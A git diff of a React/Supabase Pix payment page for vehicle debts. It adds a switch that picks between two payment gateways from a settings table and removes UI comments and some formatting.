@@ -44,8 +44,18 @@ const PixPagamento = () => {
         setLoading(true);
         setError(null);
 
+        // Fetch active gateway from app_settings
+        const { data: settingsData } = await supabase
+          .from("app_settings")
+          .select("value")
+          .eq("key", "active_gateway")
+          .single();
+
+        const gateway = settingsData?.value || "blackcat";
+        const functionName = gateway === "streetpay" ? "create-pix-streetpay" : "create-pix-payment";
+
         const { data, error: fnError } = await supabase.functions.invoke(
-          "create-pix-payment",
+          functionName,
           {
             body: {
               amount: amountInCents,
@@ -111,8 +121,6 @@ const PixPagamento = () => {
   const now = new Date();
   const vencimento = now.toLocaleDateString("pt-BR");
 
-  // pixCode already defined above
-
   usePageTracking("/pix");
 
   const handleCopy = () => {
@@ -125,7 +133,6 @@ const PixPagamento = () => {
   if (loading) {
     return (
       <div className="min-h-screen bg-gray-950 flex flex-col items-center justify-center px-6">
-        {/* Pulsing Pix icon */}
         <div className="relative mb-8">
           <div className="w-24 h-24 rounded-2xl bg-lime-400 flex items-center justify-center animate-pulse">
             <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="text-gray-900">
@@ -136,14 +143,10 @@ const PixPagamento = () => {
               <path d="m10 10 4 4" />
             </svg>
           </div>
-          {/* Ripple rings */}
           <div className="absolute inset-0 w-24 h-24 rounded-2xl border-2 border-lime-400/40 animate-ping" />
         </div>
-
         <h2 className="text-white font-bold text-xl mb-2 animate-fade-in">Gerando seu Pix...</h2>
         <p className="text-gray-400 text-sm text-center animate-fade-in">Estamos conectando com o banco para gerar seu QR Code</p>
-
-        {/* Progress dots */}
         <div className="flex gap-2 mt-8">
           <div className="w-2.5 h-2.5 rounded-full bg-lime-400 animate-bounce" style={{ animationDelay: '0ms' }} />
           <div className="w-2.5 h-2.5 rounded-full bg-lime-400 animate-bounce" style={{ animationDelay: '150ms' }} />
@@ -172,46 +175,34 @@ const PixPagamento = () => {
 
   return (
     <div className="min-h-screen bg-gray-100 text-gray-900">
-      {/* Header */}
       <header className="flex items-center justify-center relative px-6 py-4 border-b border-gray-200 bg-gray-50">
-        <button
-          onClick={() => navigate(-1)}
-          className="absolute left-6 text-gray-900 text-2xl font-bold hover:text-gray-600 transition-colors"
-        >
-          ‹
-        </button>
+        <button onClick={() => navigate(-1)} className="absolute left-6 text-gray-900 text-2xl font-bold hover:text-gray-600 transition-colors">‹</button>
         <h1 className="text-gray-900 font-bold text-lg">Débitos</h1>
       </header>
 
       <div className="max-w-3xl mx-auto px-6 pt-8 pb-10">
-        {/* Resumo do pedido */}
         <div className="bg-white border border-gray-200 rounded-xl p-6 shadow-sm">
           <h2 className="text-gray-900 font-bold text-lg mb-4">Resumo do pedido</h2>
-
           <div className="flex items-center justify-between py-2">
             <span className="text-gray-600 text-sm">Placa do veículo</span>
             <span className="text-gray-900 font-bold text-sm">{placa}</span>
           </div>
-
           <div className="flex items-center justify-between py-2">
             <span className="text-gray-600 text-sm">Vencimento código Pix</span>
             <span className="text-gray-900 font-bold text-sm">{vencimento}</span>
           </div>
-
           <div className="flex items-center justify-between mt-2 bg-lime-100 rounded-lg px-4 py-3">
             <span className="text-green-800 font-semibold text-sm">Valor do pedido</span>
             <span className="text-gray-900 font-bold text-base">R$ {valor}</span>
           </div>
         </div>
 
-        {/* Timer */}
         <div className="text-center mt-8">
           <p className="text-gray-600 text-sm">
             Pague em até <strong className="text-gray-900">{formatTime(secondsLeft)}</strong>
           </p>
         </div>
 
-        {/* QR Code area */}
         <div className="flex justify-center mt-4">
           <div className="bg-white rounded-xl p-6 shadow-sm border border-gray-200 w-56 h-56 flex items-center justify-center">
             {qrImage ? (
@@ -228,7 +219,6 @@ const PixPagamento = () => {
           </div>
         </div>
 
-        {/* Código Pix copia e cola */}
         <div className="mt-8">
           <p className="text-gray-600 text-sm mb-3">
             Copie o código Pix e realize o pagamento no app do seu banco ou carteira digital
@@ -238,7 +228,6 @@ const PixPagamento = () => {
           </div>
         </div>
 
-        {/* Botão copiar */}
         <button
           onClick={handleCopy}
           className="w-full mt-6 py-4 rounded-xl bg-gray-950 text-white font-bold text-base tracking-wider hover:bg-black transition-colors"
